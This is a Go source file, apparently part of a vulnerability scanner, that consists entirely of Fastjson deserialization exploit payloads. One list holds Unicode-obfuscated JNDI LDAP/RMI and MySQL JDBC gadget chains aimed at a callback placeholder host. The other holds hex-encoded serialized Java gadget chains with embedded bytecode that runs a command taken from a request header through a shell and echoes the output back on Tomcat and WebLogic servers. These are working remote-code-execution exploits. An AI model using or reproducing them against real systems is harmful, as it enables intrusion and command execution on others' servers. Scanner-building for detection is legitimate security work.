package fastjson

var (
	fastjsonJndiPayloads = []string{
		"{\"name\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\",\"\\u0076\\u0061\\u006c\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"},\"x\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"ldap://dnslog-url/v1\",\"autoCommit\":true}}",
		"{\"name\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\",\"\\u0076\\u0061\\u006c\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"},\"x\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"rmi://dnslog-url/v2\",\"autoCommit\":true}}",
		"{\"b\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"ldap://dnslog-url/v3\",\"autoCommit\":true}}",
		"{\"b\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"rmi://dnslog-url/v4\",\"autoCommit\":true}}",
		"{\"x\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"dnslog-url\",\"portToConnectTo\":80,\"info\":{\"user\":\"root\",\"password\":\"ubuntu\",\"useSSL\":\"false\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\"},\"databaseToConnectTo\":\"mysql\",\"url\":\"jdbc:mysql://dnslog-url/foo?allowLoadLocalInfile=true\"}}",
		"{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\"proxy\":{\"connectionString\":{\"url\":\"jdbc:mysql://dnslog-url/foo?allowLoadLocalInfile=true\"}}}",
		"{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\",\"proxy\":{\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\",\"connectionUrl\":{\"@type\":\"com.mysql.cj.conf.url.ReplicationConnectionUrl\", \"masters\":[{\"host\":\"dnslog-url\"}], \"slaves\":[],\"properties\":{\"host\":\"mysql.host\",\"user\":\"root\",\"dbname\":\"dbname\",\"password\":\"pass\",\"queryInterceptors\":\"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\"}}}}",
		"{\"dataSourceName\":\"ldap://dnslog-url/miao\",\"autoCommit\":true}",
		"{\"abc\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.BOMInputStream\",\"delegate\":{\"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\"reader\":{\"@type\":\"jdk.nashorn.api.scripting.URLReader\",\"url\":\"http://dnslog-url/\"},\"charsetName\":\"UTF-8\",\"bufferSize\":1024},\"boms\":[{\"@type\":\"org.apache.commons.io.ByteOrderMark\",\"charsetName\":\"UTF-8\",\"bytes\":[114]}]},\"address\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\"charSequence\":{\"@type\":\"java.lang.String\"{\"$ref\":\"$.abc.BOM[0]\"},\"start\":0,\"end\":0}}",
		"{\"abc\": {\"@type\": \"java.lang.AutoCloseable\"{\"@type\": \"org.apache.xbean.propertyeditor.PropertyEditorRegistry\",\"registry\":{{\"a\": 1}: {\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"rmi://dnslog-url/Exploit\"}}}}}",
		"{\"abc\": {\"@type\": \"java.lang.AutoCloseable\"{\"@type\": \"org.apache.xbean.propertyeditor.PropertyEditorRegistry\",\"registry\":{{\"a\": 1}: {\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://dnslog-url/Exploit\"}}}}}",
	}

	fastjsonEchoPayloads = []string{
		"{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"},\"f\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C77080000001000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B78707372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D657400124C6A6176612F6C616E672F537472696E673B4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000D65CAFEBABE0000003300D201001C79736F73657269616C2F50776E6572393332393233323930373132300700010100106A6176612F6C616E672F4F626A65637407000301000A536F7572636546696C6501001750776E6572393332393233323930373132302E6A617661010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700070100063C696E69743E0100032829560C0009000A0A0008000B0100106A6176612F6C616E672F54687265616407000D01000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B0C000F00100A000E001101000E67657454687265616447726F757001001928294C6A6176612F6C616E672F54687265616447726F75703B0C001300140A000E0015010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B0C001700180A000400190100077468726561647308001B01000F6A6176612F6C616E672F436C61737307001D0100106765744465636C617265644669656C6401002D284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F7265666C6563742F4669656C643B0C001F00200A001E00210100226A6176612F6C616E672F7265666C6563742F41636365737369626C654F626A65637407002301000D73657441636365737369626C65010004285A29560C002500260A002400270100176A6176612F6C616E672F7265666C6563742F4669656C64070029010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0C002B002C0A002A002D0100135B4C6A6176612F6C616E672F5468726561643B07002F0100076765744E616D6501001428294C6A6176612F6C616E672F537472696E673B0C003100320A000E0033010004657865630800350100106A6176612F6C616E672F537472696E67070037010008636F6E7461696E7301001B284C6A6176612F6C616E672F4368617253657175656E63653B295A0C0039003A0A0038003B0100046874747008003D01000674617267657408003F0100126A6176612F6C616E672F52756E6E61626C6507004101000674686973243008004301000768616E646C657208004501001E6A6176612F6C616E672F4E6F537563684669656C64457863657074696F6E07004701000D6765745375706572636C6173730C004900180A001E004A010006676C6F62616C08004C01000A70726F636573736F727308004E01000E6A6176612F7574696C2F4C69737407005001000473697A650100032829490C005200530B005100540100152849294C6A6176612F6C616E672F4F626A6563743B0C002B00560B0051005701000372657108005901000B676574526573706F6E736508005B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0C005D005E0A001E005F0100186A6176612F6C616E672F7265666C6563742F4D6574686F64070061010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0C006300640A00620065010009676574486561646572080067010003636D640800690100076973456D70747901000328295A0C006B006C0A0038006D01000973657453746174757308006F0100116A6176612F6C616E672F496E7465676572070071010004545950450100114C6A6176612F6C616E672F436C6173733B0C007300740900720075010004284929560C000900770A007200780100076F732E6E616D6508007A0100106A6176612F6C616E672F53797374656D07007C01000B67657450726F7065727479010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0C007E007F0A007D008001000B746F4C6F776572436173650C008200320A0038008301000677696E646F77080085010007636D642E6578650800870100022F630800890100072F62696E2F736808008B0100022D6308008D0100116A6176612F7574696C2F5363616E6E657207008F0100186A6176612F6C616E672F50726F636573734275696C646572070091010016285B4C6A6176612F6C616E672F537472696E673B29560C000900930A00920094010005737461727401001528294C6A6176612F6C616E672F50726F636573733B0C009600970A009200980100116A6176612F6C616E672F50726F6365737307009A01000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B0C009C009D0A009B009E010018284C6A6176612F696F2F496E70757453747265616D3B29560C000900A00A009000A10100025C410800A301000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0C00A500A60A009000A70100046E6578740C00A900320A009000AA010008676574427974657301000428295B420C00AC00AD0A003800AE0100246F72672E6170616368652E746F6D6361742E7574696C2E6275662E427974654368756E6B0800B0010007666F724E616D65010025284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F436C6173733B0C00B200B30A001E00B401000B6E6577496E7374616E636501001428294C6A6176612F6C616E672F4F626A6563743B0C00B600B70A001E00B801000873657442797465730800BA0100025B420700BC0100116765744465636C617265644D6574686F640C00BE005E0A001E00BF010007646F57726974650800C101001F6A6176612F6C616E672F4E6F537563684D6574686F64457863657074696F6E0700C30100136A6176612E6E696F2E427974654275666665720800C5010004777261700800C70100136A6176612F6C616E672F457863657074696F6E0700C9010004436F646501000A457863657074696F6E730100156A6176612F6C616E672F54687265616447726F75700700CD0100135B4C6A6176612F6C616E672F537472696E673B0700CF01000D537461636B4D61705461626C6500210002000800000000000100010009000A000200CB00000419000900160000030B2AB7000C033CB80012B600164D2CB6001A121CB600224E2D04B600282D2CB6002EC000303A0403360515051904BEA202DC19041505323A06190601A60006A702C61906B600343A0719071236B6003C9A000D1907123EB6003C9A0006A702A81906B6001A1240B600224E2D04B600282D1906B6002E3A081908C100429A0006A702851908B6001A1244B600224E2D04B600282D1908B6002E3A081908B6001A1246B600224EA700193A091908B6001AB6004BB6004B1246B600224EA700032D04B600282D1908B6002E3A081908B6001AB6004B124DB600224EA700133A0A1908B6001A124DB600224EA700032D04B600282D1908B6002E3A081908B6001A124FB600224E2D04B600282D1908B6002EC000513A0B03360C150C190BB900550100A201D2190B150CB9005802003A0D190DB6001A125AB600224E2D04B600282D190DB6002E3A0E190EB6001A125C03BD001EB60060190E03BD0004B600663A0F190EB6001A126804BD001E5903123853B60060190E04BD00045903126A53B60066C000383A07190701A5000B1907B6006E990006A70152190FB6001A127004BD001E5903B2007653B60060190F04BD00045903BB0072591100C8B7007953B6006657127BB80081B600841286B6003C99001906BD003859031288535904128A535905190753A7001606BD00385903128C535904128E5359051907533A10BB009059BB0092591910B70095B60099B6009FB700A212A4B600A8B600ABB600AF3A1112B1B800B53A121912B600B93A08191212BB06BD001E590312BD535904B20076535905B2007653B600C0190806BD000459031911535904BB00725903B70079535905BB0072591911BEB7007953B6006657190FB6001A12C204BD001E5903191253B60060190F04BD00045903190853B6006657A700513A1312C6B800B53A14191412C804BD001E590312BD53B600C0191404BD00045903191153B600663A08190FB6001A12C204BD001E5903191453B60060190F04BD00045903190853B6006657A70003043C1B990006A70009840C01A7FE281B990006A70014A7000B3A15A70006A70000840501A7FD22B10004009A00A500A8004800CB00D900DC0048021F0292029500C4003102F902FC00CA000100D1000000DC0018FF00290006070002010700CE07002A070030010000FC001707000EFC001A07003802FC002207000465070048155D0700480FFF002A000D070002010700CE07002A0700300107000E0700380700040000070051010000FE007B07000407000407000402FB0050520700D0FF009A0012070002010700CE07002A0700300107000E0700380700040000070051010700040700040700040700D00700BD00010700C4FB004DF9000106F8000506FF00020006070002010700CE07002A0700300100010700CA04FF00020006070002010700CE07002A0700300100000500CC00000004000100CA000100050000000200067074000450776E7270770100787372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D6571007E00095B000B69506172616D547970657371007E00087870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000E6E65775472616E73666F726D6572757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00003F4000000000000C7708000000100000000078787400017478;\"}}",
		"{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"},\"f\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C77080000001000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B78707372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C6173737400125B4C6A6176612F6C616E672F436C6173733B4C00055F6E616D657400124C6A6176612F6C616E672F537472696E673B4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E00200007870000006D8CAFEBABE00000033006E01001D79736F73657269616C2F50776E657231303638383235383736323339380700010100106A6176612F6C616E672F4F626A65637407000301000A536F7572636546696C6501001850776E657231303638383235383736323339382E6A617661010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700070100063C696E69743E0100032829560C0009000A0A0008000B0100106A6176612F6C616E672F54687265616407000D01000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B0C000F00100A000E0011010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B0C001300140A0004001501000E67657443757272656E74576F726B08001701000F6A6176612F6C616E672F436C6173730700190100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0C001B001C0A001A001D0100186A6176612F6C616E672F7265666C6563742F4D6574686F6407001F010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0C002100220A002000230100096765744865616465720800250100106A6176612F6C616E672F537472696E67070027010003636D640800290100116A6176612F7574696C2F5363616E6E657207002B0100116A6176612F6C616E672F52756E74696D6507002D01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C002F00300A002E003101000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C003300340A002E00350100116A6176612F6C616E672F50726F6365737307003701000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B0C0039003A0A0038003B010018284C6A6176612F696F2F496E70757453747265616D3B29560C0009003D0A002C003E0100025C4108004001000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0C004200430A002C00440100046E65787401001428294C6A6176612F6C616E672F537472696E673B0C004600470A002C004801000B676574526573706F6E736508004A010016676574536572766C65744F757470757453747265616D08004C0100237765626C6F6769632E786D6C2E7574696C2E537472696E67496E70757453747265616D08004E010007666F724E616D65010025284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F436C6173733B0C005000510A001A005201000E676574436F6E7374727563746F72010033285B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F436F6E7374727563746F723B0C005400550A001A005601001D6A6176612F6C616E672F7265666C6563742F436F6E7374727563746F7207005801000B6E6577496E7374616E6365010027285B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0C005A005B0A0059005C01000B777269746553747265616D08005E0100136A6176612E696F2E496E70757453747265616D080060010005666C7573680800620100096765745772697465720800640100057772697465080066010000080068010004436F646501000A457863657074696F6E730100136A6176612F6C616E672F457863657074696F6E07006C00210002000800000000000100010009000A0002006A0000010B00060006000000FF2AB7000CB80012B60016121801B6001EB8001201B600244C2BB60016122604BD001A5903122853B6001E2B04BD00045903122A53B60024C000284DBB002C59B800322CB60036B6003CB7003F1241B60045B600494E2BB60016124B01B6001E2B01B600243A041904B60016124D01B6001E190401B600243A05124FB8005304BD001A5903122853B6005704BD000459032D53B6005D4C1905B60016125F04BD001A59031261B8005353B6001E190504BD000459032B53B60024571905B60016126301B6001E190501B60024571904B60016126501B6001E190401B600244C2BB60016126704BD001A5903122853B6001E2B04BD00045903126953B6002457B100000000006B000000040001006D000100050000000200067074000450776E7270770100787372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D6571007E00095B000B69506172616D547970657371007E00087870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000E6E65775472616E73666F726D6572757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00003F4000000000000C7708000000100000000078787400017478;\"}}",
	}
)
